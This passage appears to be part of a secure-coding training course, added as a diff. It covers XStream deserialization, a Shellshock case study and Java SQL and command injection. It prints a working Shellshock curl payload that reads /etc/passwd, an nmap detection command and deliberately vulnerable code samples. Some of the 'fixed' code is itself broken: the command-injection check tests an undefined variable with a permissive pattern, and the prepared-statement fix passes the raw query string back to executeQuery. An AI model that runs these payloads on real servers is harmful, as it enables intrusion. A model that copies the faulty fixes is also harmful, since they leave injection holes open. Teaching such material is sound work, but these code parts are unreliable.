+First, Alice should remember that deserialization of arbitrary user-supplied content is a dangerous thing. +
+Second, Alice must ensure to *not trust serialized data* and *use whitelisting*: define *explicit permissions for types*, to check the type of an object that should be deserialized. +
+With these permissions, it is at least not possible to inject unexpected types into an object graph.
+
+.Remediation
+[source,java]
+----
+public class XStreamDeserializer {
+  public static AccountManager getAccountManager(HttpRequestServlet request) {
+    XStream xstream = new XStream();
+    xstream.addPermission(NoTypePermission.NONE);
+    TypePermission tp = new ExplicitTypePermission(
+      new Class[] {
+        AccountManager.class
+          });
+    xstream.addPermission(tp);
+    try {
+      String accountManagerXML = IOUtils.toString(request.getReader());
+      AccountManager am = (AccountManager)xstream.fromXML(accountManagerXML);
+      return am;
+    }
+    catch ( /*..*/ ) {
+      /* Handle various XStream parsing exceptions */
+      return null;
+    }
+  }
+}
+----
+
+To mitigate the issue with the *default XStream object having access to any and all classes available to the code*, the *scope of classes XStream has access to must be reduced to only those that are required and were designed by the developer in a way that does not permit execution of any malicious code*. +
+`NoTypePermission.NONE` sets the TypePermissions to None, and XStream may no longer access the entire space of classes available to running code.
+
+Then by adding a class-specific permission `ExplicitTypePermission`, the developer guarantees that the only classes that may be deserialized by XStream - are the ones of their choosing, like the `AccountManager.class` in or example.
+
+Which content types are vulnerable to deserialization?
+
+    * Deserialization does not depend on medium +
+    Any serialization format, including proprietary formats, can be used for deserialization – if implementation allows.
+
+==== Components With Know Vulnerabilities
+
+Code libraries, both proprietary and third-party, need constant maintenance and updates. Even if proprietary code is 100% secure, failure to update third-party components, and particularly updates that mitigate security vulnerabilities, will likely leave environments vulnerable to attack.
+
+When development teams use component-heavy development patterns, they sometimes not even understand which components they use in their applications or APIs, much less keeping them up to date. +
+Developers often do not know:
+
+    * The versions of all components they use (both client-side and server-side);
+    * If the software they use (OS, web/application server, database management systems, run-time environments, and libraries) is vulnerable, unsupported, or out of date;
+    * If the underlying platform, frameworks, and dependencies are fixed or upgraded in a timely fashion;
+    * If the compatibility of updated, upgraded, or patched libraries is tested.
+
+Some of the largest breaches (like the *Equifax hack*) have relied on exploiting known vulnerabilities in components.
+The nastiest consequence of exploiting such kind of vulnerability is the *Remote Code Execution* (RCE).
+If you can execute the remote Bash command on the server - then you have a foot in the door, and can do everything to this server:
+
+    * Get access to internal data and dump internal files for public retrieval.
+    * Upload and execute a backdoor.
+    * Use the server as a cryptocurrency miner.
+    * Use the server as a part of a botnet.
+
+In 2014, right after the *Heartbleed* vulnerability was disclosed to the general public, another vulnerability of comparable severity was discovered and called *ShellShock*. We'll use it as a case study, as it is practically universal and attacks one of the most common server operating systems in a way that also exposes many Web technologies to direct attack.
+
+This vulnerability affected web servers where *mod_cgi* was used, and the Common Gateway Interface (CGI) was written in a shell script or any commands were executed from the CGI.
+
+*mod_cgi* is responsible for handling the execution of shell/Perl/Python/PHP scripts on the web server. Usually, the web server passes user variables to those scripts so they can do their work. The *ShellShock* vulnerability allowed an attacker to pass a command as a variable that gets executed by Bash.
+
+In this lesson, the *ShellShock* vulnerability in the *cPanel* management tool will be explored. cPanel is often embedded in Apache web-server configurations.
+
+Alice is a software developer for a Suredence insurance company. She has just finished developing a record keeping application. She has it thoroughly reviewed and tested by her peers and is satisfied that it is secure and ready for deployment.
+
+Due to the tight schedule of a DevOps team, Alice is tasked with deploying her application herself. However, Alice is not particularly experienced with web-server internals and configuration files editing. So, she decided to use an *older Apache web-server image* she found in a repository in her organization, which was preconfigured with *cPanel* (that provides a graphical interface and automation tools to simplify the process of hosting a web site), and easily deployed her application there.
+
+The vulnerable application pane loads a record keeping application. Alice is an authorized user of this application. She logs in with the following credentials to check if everythind was deployed correctly:
+
+    Username: alice@suredence.com
+    Password: Alice123!
+
+Bob is a hacker. He scans the Web, testing for old and recent Bash vulnerabilities (there is always a possibility that someone forgot to run an update on their server). +
+In his discovery, Bob uses an Internet port scanner and a Proxy tool to intercept HTTP/S requests, allowing him to also tamper with them and create malicious request payloads.
+
+Bob knows that insurance companies may store large amounts of user personal data which could be a great trophy for a skillful hacker. +
+He intercepted several HTTP requests to the records.suredence.com server and noticed that HTTP response headers disclose an older Apache web server version, which could indicate a lacking patching policy and process.
+
+He decided to test this web server for the Shellshock vulnerability specifically. For this purpose, Bob uses a dedicated script which is built into recent versions of *nmap* port scanner:
+
+    nmap -sV -p443 --script http-shellshock records.suredence.com
+
+[source,shell]
+----
+[bob@hackserver~]# nmap -sV -p443 --script http-shellshock records.suredence.com
+Starting Nmap 7.60 ( https://nmap.org ) at Tue Mar 09 2021 21:59:31 GMT+0100 (heure normale d’Europe centrale) 
+Nmap scan report for records.suredence.com (2.2.27)
+Host is up (0.023s latency).
+rDNS record for 2.2.27: server-2-2-27.fra2.r.cloudfront.net
+PORT    STATE SERVICE  VERSION
+443/tcp open  ssl/http Apache httpd 2.2.27
+| http-shellshock:
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|   State: VULNERABLE (Exploitable)
+|   IDs:  CVE:CVE-2014-6271
+|   This web application might be affected by the vulnerability known as Shellshock. It seems the server
+|   is executing commands injected via malicious HTTP headers.
+|   
+|   Disclosure date: 2014-09-24
+|   References:
+|   http: //www.openwall.com/lists/oss-security/2014/09/24/10
+|   https: //cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+|   http: //seclists.org/oss-sec/2014/q3/685
+|   http: //cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+Service detection performed. Please report any incorrect results at https: //nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds
+[bob@hackserver~]#
+----
+
+Bob receives a response that indicates that records.suredence.com server, where Alice's application runs, is *vulnerable to Shellshock*.
+
+Bob decides to try a code injection attack on records.suredence.com server. 
+In the console, Bob creates a malicious request to Alice's server:
+
+    curl -H "custom:() { :; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd" http://records.suredence.com
+
+In the console, Bob receives a response, where the content of the passwd file from Alice's webserver is displayed. +
+Now we see that despite her code being secure on its own, Alice forgot to update the system, whose version of *cPanel* is vulnerable to Shellshock.
+
+You could probably notice that it’s super easy to execute the attack, and there is no authentication required when exploiting Bash via CGI scripts.
+
+[source]
+----
+[bob@hackserver~]# curl -H "custom:() { :; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd" http://records.suredence.com
+> GET http://records.suredence.com
+> Host: records.suredence.com
+> User-Agent: curl/7.54.0"}
+> Accept: */*
+> "custom: () { :; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd"
+root:x:0:0:root:/root:/bin/bash 
+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+ sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+ sync:x:4:65534:sync:/bin:/bin/sync 
+ 
+  ... 
+ 
+  Content-Type: text/html 
+ 
+ <!DOCTYPE html> 
+ <html lang='en'> 
+ <head> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <title></title> 
+ </head> 
+ <body> 
+  ... 
+ </body>
+[bob@hackserver~]#
+----
+
+The *Shellshock* vulnerability affected certain version of the GNU Bash parser (up to version 4.3). +
+The vulnerability resided in *the ability to arbitrarily define environment variables which specify a function definition within a Bash shell. When Bash continued to process shell commands after the function definition, a code injection attack became possible.*
+
+*The Shellshock bug is a parser bug and an encapsulation bug*. +
+When we set the value of some environment variable "x", we make sure it is wrapped in apostrophes ('). Shellshock occurs despite proper encapsulation allowing it to be escaped.
+
+Let's check if our Bash is vulnerable. Set the following value into "x":
+
+    env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+
+[source,bash]
+----
+[root@recordssuredence~]# env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+ vulnerable
+ hello
+[root@recordssuredence~]#
+----
+
+If your Bash is vulnerable, this will actually print two words: *vulnerable* and *hello* - to standard output.
+
+Lets looks why this happens:
+
+    * First, the Bash parser allows the character combination `(){:;}` (which is a function definition) to terminate the apostrophe.
+    * Then " ; " terminates the code line.
+    * After that echo vulnerable is executed as Bash code.
+    * And at the end, `echo hello` command is read from the string and is executed by Bash.
+
+====== Remediation
+
+One may think that those servers that were operating in a Microsoft-centric environment were safe. But non-Microsoft components could exist in a corporate ecosystem, for example, sitting in front of the Microsoft application stack and route the traffic before it reaches the web servers.
+
+Also many IoT devices (including routers) run embedded Linux distributions with Bash shells and therefore were also vulnerable to this kind of attacks (and may be still vulnerable now). Who can ever think of updating a smart light bulb?
+
+To mitigate such issues, there should be a *patch management process* in place to:
+
+    * Remove unused dependencies, unnecessary features, components, files, and documentation.
+    * Keep inventory of the versions of both client-side and server-side components (e.g. frameworks, libraries, etc.) and their dependencies. Continuously monitor sources like CVE and NVD for vulnerabilities in the components.
+    * Only obtain components from official sources over secure links. Prefer signed packages to reduce the chance of including a modified, malicious component.
+    * Monitor for libraries and components that are unmaintained or do not create security patches for older versions.
+
+Alice wants to know what she could do to prevent the issue occurring in the future. +
+As a general rule, Alice should always check that her *infrastructure is up to date on all its software versions*, and, if she is not able to, she should contact someone who can.
+
+In our specific example, she should upgrade to a new version of Bash (by running `sudo apt-get install bash`), as Bash is used by Apache *mod_cgi*, which in turn is used by *cPanel*. +
+Then *she should check that no code can be executed after the end of a Bash function*, because sometimes patches against vulnerabilities are not entirely effective.
+
+[source,bash]
+----
+[root@recordssuredence~]# sudo apt-get install bash
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+Calculating upgrade... Done
+The following packages will be upgraded
+bash bash-builtins bash-completion bash-doc bash-static bashdb libbashlibbash-doc node-bash-match
+9 upgraded, 0 newly installed, 0 to remove and 125 not upgraded.
+[root@recordssuredence~]#
+----
+
+Let's make Alice run the following command once again to check if the update fixed this issue:
+
+    env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+
+[source,bash]
+----
+[root@recordssuredence~]# env x='() { :;}; echo vulnerable' bash -c 'echo hello'
+ hello
+[root@recordssuredence~]#
+----
+
+As you can see, only a legitimate response was output to console.
+
+Why vulnerabilities in third-party software components persist?
+
+    * Update of third-party components used in applications usually requires a big amount of testing and is often considered as an unimportant technical debt +
+    *Security is everybody's job* meaning both *security engineers and developers* should participate in tasks aiming at security. Vendors tend to mitigate vulnerabilities as soon as possible, and it is really important to patch the vulnerable component according to its severity level. Update of components indeed requires a lot of testing but it should be included into plans and performed in a timely manner.
+    
+== Java Advanced
+
+=== Injection
+
+==== SQL Injection
+
+.Vulnerable code
+[source,java]
+----
+// Both "comment" and "type" variables should be defined for the "getPaymentsList" method to work properly.
+​
+public static ArrayList<Payment> getPaymentsList(Connection connection, int currentUserId, int paymentType, String paymentComment) throws SQLException {
+  Statement statement = connection.createStatement();
+  String query = "select * from sqli.payments where userid = " + currentUserId + " and type = " + paymentType + " and comment LIKE '%" +paymentComment + "%' ORDER BY date";
+  
+  ResultSet rs = statement.executeQuery(query);
+  ArrayList<Payment> payments = new ArrayList<>();
+  while (rs.next()){
+    Payment payment = new Payment();
+    payment.setAmount(rs.getInt("amount"));
+    payment.setType(rs.getInt("type"));
+    payment.setComment(rs.getString("comment"));
+    payment.setDate(rs.getDate("date"));
+    payments.add(payment);
+  }
+  connection.close();
+  return payments;
+}
+public class Payment {
+  private Integer amount;
+  private Date date;
+  private Integer type;
+  private String comment;
+  //getters and setters
+}
+----
+
+One could probably think about *input validation* (i.e. checking of legal characters, minimum/maximum string lengths, removal of "malicious" characters) as a remediation strategy, but this is a *bad approach*.
+Input validation is based on blacklists, and blacklists *could be bypassed by a skilled attacker*.
+
+*Prepared statements* (aka parameterized queries) are an *effective way to prevent SQL injection attacks*.
+
+Prepared statements are used to abstract SQL statement syntax from input parameters. Statement templates are first defined at the application layer, and the parameters are then passed to them.
+
+Aside from better protection against SQL injection attacks, prepared statements offer improved code quality from a legibility and maintainability perspective due to the separation of the SQL logic from its inputs.
+
+Let us now see how a fix can be applied to our vulnerable example to remediate the SQL Injection vulnerability.
+
+.Remediation
+[source,java]
+----
+// Both "comment" and "type" variables should be defined for the "getPaymentsList" method to work properly.
+​
+//public static ArrayList<Payment> getPaymentsList(Connection connection, int currentUserId, int paymentType, String paymentComment) throws SQLException {
+//  Statement statement = connection.createStatement();
+//  String query = "select * from sqli.payments where userid = " + currentUserId + " and type = " + paymentType + " and comment LIKE '%" +paymentComment + "%' ORDER BY date";
+  
+//  ResultSet rs = statement.executeQuery(query);
+​
+public static ArrayList<Payment> secureGetPaymentsList(Connection connection, int currentUserId, int paymentType, String paymentComment) throws SQLException {
+  String query = "select * from sqli.payments where userid = ? and comment LIKE ? and type = ? ORDER BY date";
+  PreparedStatement statement = connection.prepareStatement(query);
+  statement.setInt(1,currentUserId);
+  statement.setString(2,"%"+paymentComment+"%");
+  statement.setInt(3,paymentType);
+  
+  ResultSet rs = statement.executeQuery();
+  
+  ArrayList<Payment> payments = new ArrayList<>();
+  while (rs.next()){
+    Payment payment = new Payment();
+    payment.setAmount(rs.getInt("amount"));
+    payment.setType(rs.getInt("type"));
+    payment.setComment(rs.getString("comment"));
+    payment.setDate(rs.getDate("date"));
+    payments.add(payment);
+  }
+  connection.close();
+  return payments;
+}
+public class Payment {
+  private Integer amount;
+  private Date date;
+  private Integer type;
+  private String comment;
+  //getters and setters
+}
+----
+
+Another way to avoid SQL injections is to let your framework take care of operations that require interaction with the database.
+
+[source,java]
+----
+public interface PaymentsRepository extends CrudRepository<Payments, Long>{ 
+  @Query(value = "select * from payments p where p.userid = :userId and p.type = :type and p.comment like concat('%',:comment,'%') ORDER BY p.date" , nativeQuery = true)
+  ArrayList<Payments> getFilteredPayments(@Param("type") int type,
+                                          @Param("comment") String comment,
+                                          @Param("userId") int userId);
+}
+----
+
+Alternatively, you can let *Spring* handle the repository creation. It provides basic CRUD operations out of the box.
+
+If you need a query, you can create a method and annotate it with `@Query`. The query derives parameters from the method arguments. This approach doesn't let SQL injections happen.
+
+==== Command Injection
+
+A *Command Injection vulnerability* results in the execution of arbitrary system commands on the host operating system. Command Injection attacks are possible when an application passes unsafe user-supplied data to a system command. Using this input, the malicious command is created and executed server-side with the same privileges as the application.
+
+In the following code sample, user-supplied data is passed in the filename of the uploaded file. This file is then resized by the ImageMagick component, and the filename is concatenated with the arguments of the bash command.
+
+.Vulnerable code
+[source,java]
+----
+public class SomeClass {
+  public someMethod(){
+    /*
+    Processing the user request and file upload. 
+    */
+    convert(filename, userId); 
+  }
+}
+public class ImageTools{
+  public static void convert(String filename, long userId) throws IOException {
+    ProcessBuilder pb = new ProcessBuilder();
+    pb.command("bash","-c","convert /path/to/uploaded/files/" + filename + " -resize 50% /path/to/screenshots/folder/" + userId 
+    + "/randomlyGenerateFileName.jpg"); 
+    pb.start(); 
+  }
+}
+----
+
+`bash` command is called with the specified arguments. Arguments for `bash` command are concatenated with the name of the uploaded file. The `filename` variable is not sanitized and thus malicious filename can break the command syntax and insert additional commands.
+
+When the *Command Injection* attack is successful, it could be used to seriously compromise the application and even the underlying server. Once the underlying server is compromised, an attacker could mount attacks against other systems the server is connected to within the DMZ or the internal network.
+
+The most effective way to prevent Command Injection vulnerabilities is to *avoid calling OS commands* from the application code (maybe the same result could be achieved by using some API or library).
+
+If the execution of OS commands cannot be avoided, *don't use user-supplied input* to run them.
+
+If it is not possible to avoid user-supplied input in calling out to OS commands, then *strong input validation* must be implemented. It must be *based on a whitelist of allowed characters*. *Don't use blacklists* because they tend to be bypassed by a skilled attacker.
+
+Please note that even if you whitelist only alphanumeric symbols, and the attacker fails to break the syntax of the existing command and inject his malicious command, he could still be able to add an argument to the existing command that would *change the result of its execution*.
+
+A defense-in-depth approach also recommends to carefully set permissions for the application and its components to prevent OS commands execution.
+
+Let us now see how a fix can be applied to our vulnerable example to remediate the command injection vulnerability.
+
+.Remediation
+[source,java]
+----
+public class SomeClass {
+  public someMethod(){
+    /*
+    Processing the user request and file upload. 
+    */
+    if (okName.matches("[A-Za-z0-9/.]+")){
+    convert(filename, userId); }
+  }
+}
+public class ImageTools{
+  public static void convert(String filename, long userId) throws IOException {
+    ProcessBuilder pb = new ProcessBuilder();
+    pb.command("bash","-c","convert /path/to/uploaded/files/" + filename + " -resize 50% /path/to/screenshots/folder/" 
+    + userId + "/randomlyGenerateFileName.jpg"); 
+    pb.start(); 
+  }
+}
+----
+
+==== Second Order SQL Injection
+
+*Second-Order SQL Injection* happens when a *malicious user saves the malicious payload in the database of a server-side application*, and then this saved payload is used by another server-side application in its requests to the database. A successful Second-Order SQL injection attack exposes the data of the underlying database directly to the attacker. 
+
+The typical flow of the Second-Order SQL Injection looks like the following:
+
+    1. Tainted data is inserted into the database securely using an approach that prevents SQL injections.
+    2. Tainted data is then insecurely used as a part of an SQL query leading to the SQL injection.
+
+.Vulnerable code
+[source,java]
+----
+private static String getUsername(Connection connection, long id) throws SQLException {
+
+  String query = "select username from users_link where id_ibank = ?";
+
+  PreparedStatement prStatement = connection.prepareStatement(query);
+  prStatement.setLong(1,id);
+  ResultSet rs = prStatement.executeQuery();
+  rs.next();
+
+  return rs.getString("username");
+}
+private static ArrayList<Transfer> GetTransferList(Connection connection, String username) throws SQLException {
+
+  String query = "select * from transfers where username = \'" + username + "\'";
+
+  // Careful! Unsecure "simple" statement here!
+  Statement statement = connection.createStatement();
+  ResultSet rs = statement.executeQuery(query);
+
+  ArrayList<Transfer> transfers = new ArrayList<>();
+  while (rs.next()){
+    Transfer transfer = new Transfer();
+    transfer.setAmount(rs.getLong("amount"));
+    transfer.setFrom(rs.getString("from"));
+    transfer.setTo(rs.getString("to"));
+    transfer.setCity(rs.getString("city"));
+    transfer.setCountry(rs.getString("country"));
+    transfers.add(transfer);
+  }
+  connection.close();
+
+  return transfers;
+}
+----
+
+In the previous code sample, the records are selected from the database using the user-supplied parameter that was saved to the database. If the value of that parameter is tainted, then the query will result in the SQL Injection.
+
+But how could it happen, that the tainted input was saved to the database without any sanitization?
+
+This parameter was passed between the two applications, and the developer of the first app thought that sanitization will be performed on the side of the second app, but the developer of the second app thought that it would get already sanitized value and didn't implement any checks. As a result, no sanitization was performed along the way to the database.
+
+If we cannot guarantee that the user-supplied parameter that we pass to our query is properly sanitized (and in modern complex information systems it is not really possible to provide such guarantees), then we should write the queries in a secure manner.
+
+*Prepared statements* (aka parameterized queries) are an effective way to *prevent all kinds of SQL injection attacks*.
+
+Prepared statements are used to *abstract SQL statement syntax from input parameters*. Statement templates are first defined at the application layer, and the parameters are then passed to them.
+
+Aside from better protection against SQL injection attacks, prepared statements offer *improved code quality* from a legibility and maintainability perspective due to the *separation of the SQL logic from its inputs*.
+
+===== Remediation
+
+Let us now see how a fix can be applied to our vulnerable example to remediate the Second-Order SQL Injection vulnerability.
+
+.Remediation
+[source,java]
+----
+private static ArrayList<Transfer> secureGetTransferList(Connection connection, String username) throws SQLException {
+  String query ="select * from transfers where username = ?";
+  PreparedStatement statement = connection.prepareStatement(query);
+  statement.setString(1,username);
+​
+  ResultSet rs = statement.executeQuery(query);
+  ArrayList<Transfer> transfers = new ArrayList<>();
+  while (rs.next()){
+    Transfer transfer = new Transfer();
+    transfer.setAmount(rs.getLong("amount"));
+    transfer.setFrom(rs.getString("from"));
+    transfer.setTo(rs.getString("to"));
+    transfer.setCity(rs.getString("city"));
+    transfer.setCountry(rs.getString("country"));
+    transfers.add(transfer);
+  }
+  connection.close();
+  return transfers;
+}
+----
+
+Another way to avoid SQL injections is to let your *framework* (like Spring) take care of operations that require *interaction with the database*:
+
+[source,java]
+----
+public interface TransfersRepository extends CrudRepository<Transfers, Long> { 
+  List<Transfers> findByUsername(String username);
+}
+----
+
+==== Use of insufficiently random values
+
+TO BE COMPLETED
+
